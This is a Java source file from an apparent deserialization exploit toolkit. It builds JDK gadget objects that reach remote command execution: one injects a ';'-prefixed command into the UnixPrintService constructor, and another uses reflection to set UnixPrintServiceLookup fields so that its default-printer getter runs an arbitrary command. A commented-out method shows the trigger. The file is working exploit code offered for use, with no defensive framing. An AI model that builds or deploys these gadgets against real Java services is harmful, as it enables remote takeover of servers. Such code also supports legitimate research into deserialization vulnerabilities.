package xyz.eki.marshalexp.gadget.jdk;

import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.ObjectBean;
import sun.misc.Unsafe;
import sun.print.UnixPrintService;
import sun.print.UnixPrintServiceLookup;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;

public class GUnixPrintService {
    public static UnixPrintService getter2RCE(String cmd) throws Exception{
        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixPrintService.class);
        constructor.setAccessible(true);
        return (UnixPrintService) constructor.newInstance(";"+cmd);
    }


//    public static void RCE(String cmd) throws Exception{
//        UnixPrintService exp = GUnixPrintService.getter2RCE(cmd);
//        Method getPrinterIsAcceptingJobsAIXMethod = UnixPrintService.class.getDeclaredMethod("getPrinterIsAcceptingJobsAIX",null);
//        getPrinterIsAcceptingJobsAIXMethod.setAccessible(true);
//        getPrinterIsAcceptingJobsAIXMethod.invoke(exp,null);
//    }

    // sun.print.UnixPrintServiceLookup.getDefaultPrintService()
    // sun.print.UnixPrintServiceLookup.getDefaultPrinterNameBSD()
    // sun.print.UnixPrintServiceLookup.execCmd(UnixPrintServiceLookup.lpcFirstCom[cmdIndex])
    // 需要在容器内 并且反序列化器支持Not Imply Serializable
    public static UnixPrintServiceLookup getDefaultPrintService2RCE(String cmd) throws  Exception{
//        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixPrintServiceLookup.class);
//        UnixPrintServiceLookup lookup = (UnixPrintServiceLookup) constructor.newInstance();
        //直接新建类
        UnixPrintServiceLookup lookup =  (UnixPrintServiceLookup) ReflectUtils.forceNewInstance(UnixPrintServiceLookup.class);

        ReflectUtils.setFieldValue(lookup,"osname","eki");
        ReflectUtils.setFieldValue(lookup,"cmdIndex",0);
        ReflectUtils.setFieldValue(lookup,"lpcFirstCom",new String[]{cmd});
        return lookup;
    }
}
